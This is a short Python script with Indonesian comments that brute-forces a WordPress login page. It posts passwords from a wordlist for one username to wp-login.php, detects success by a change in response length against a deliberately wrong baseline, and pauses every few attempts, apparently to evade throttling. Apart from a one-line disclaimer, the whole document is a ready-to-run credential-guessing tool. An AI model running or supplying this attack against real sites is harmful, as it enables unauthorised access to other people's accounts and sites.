#   Deskripsi
#  Simple program untuk membrute force wordpress login page
#  Info lanjutan tentang brutefroce -> https://en.wikipedia.org/wiki/Brute-force_attack
#   Disclaimer
#  Jangan digunakan untuk tindakan yang tidak dapat dipertanggung jawabkan!
#   Penggunaan
#  'python wpbrute.py -t <base_url> -u <username(single)> -p <file_where_you_store_password_wordlist>'

from time import sleep
from requests import *
from argparse import *

# global var

passlist=[]

# end - global var

def error(message):
    print("[*] Error : %s" %message)
    exit(1)

def send_req(url,username,passwd):


    the_url=url+'/wp-login.php'
    headers={'Cookie':'wordpress_test_cookie=WP+Cookie+check'}
    body="log="+username+"&pwd="+passwd+"&wp-submit=Log+Masuk&redirect_to="+url+"%2Fwp-admin%2F&testcookie=1"
    p=post(the_url,data=body,headers=headers)
    print('\rusername : %s\t| password: %s'%(username,passwd),end='')
    return len(p.text)
    

def sure_wrong(url,username):
    the_url=url+'/wp-login.php'
    return send_req(url,username,'lLlIlLl')

def file_handle(filename):
    
    global file_text
    
    try:
        file_text=open(filename,'r').read()
    except:
        error("Can't open %s file" %filename)

    file_text=file_text.split('\n')
    file_text.pop()
    
def args_parser():
    
    parser=ArgumentParser()
    parser.add_argument('-t',help='URL of the target')
    parser.add_argument('-p',help='File where list of password is stored')
    parser.add_argument('-u',help='Single username that you chose')

    args=parser.parse_args()
    return args

def main(url,username,pass_file):
    
    i=0
    file_handle(pass_file)
    the_wrong=sure_wrong(url,username)

    for i in range(len(file_text)):
        i+=1
        if(i%5==0):
            sleep(6)
        if(send_req(url,username,file_text[i])!=the_wrong): 
           break


if __name__=='__main__':
    
    args=args_parser()
    main(args.t, args.u, args.p)
